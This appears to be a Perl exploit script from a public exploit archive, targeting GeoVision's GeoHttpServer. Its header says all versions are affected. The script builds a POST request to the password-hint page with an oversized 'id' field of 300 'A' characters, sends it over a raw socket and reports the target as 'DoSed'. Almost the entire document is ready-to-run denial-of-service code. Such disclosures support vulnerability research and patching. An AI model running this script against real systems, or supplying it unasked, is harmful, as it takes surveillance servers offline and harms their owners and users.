#!/usr/bin/perl

# Exploit Title: GeoHttpServer remote DoS
# Date: 7-5-2010
# Author: aviho1
# vendor: GeoVision
# Version: all
#info: the password recovery page does not properly validate user-supplied
password ,causing a dos.
use IO::Socket;

my $host = shift || 'localhost'; # Target host
my $port = shift || 80;

my $req = "POST /HintPwd.htm HTTP/1.1\r\n";
$req .= "Host: $host:$port\r\n";
$req .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; he;
rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (.NET CLR 3.5.30729)\r\n";
$req .= "Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
$req .= "Accept-Language: he,en-US;q=0.7,en;q=0.3\r\n";
$req .= "Accept-Encoding: gzip,deflate\r\n";
$req .= "Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n";
$req .= "Keep-Alive: 300\r\n";
$req .= "Connection: keep-alive\r\n";
$req .= "Referer: http://$host/\r\n";
$req .= "Content-Type: application/x-www-form-urlencoded\r\n";
$req .= "Content-Length: 309\r\n\r\n";
$req .=  "id=" . "A" x 300 . "&OK=OK";
print "\nConnecting to $host on port $port\n";

my $sock = new IO::Socket::INET( PeerAddr => $host, PeerPort => $port, Proto
=> 'tcp');
$sock or die "Cannot connect to server: $!";
print "Sending HTTP request..\n";
print $sock $req;
print "Exploited. Target should be DoSed\n";

close $sock;
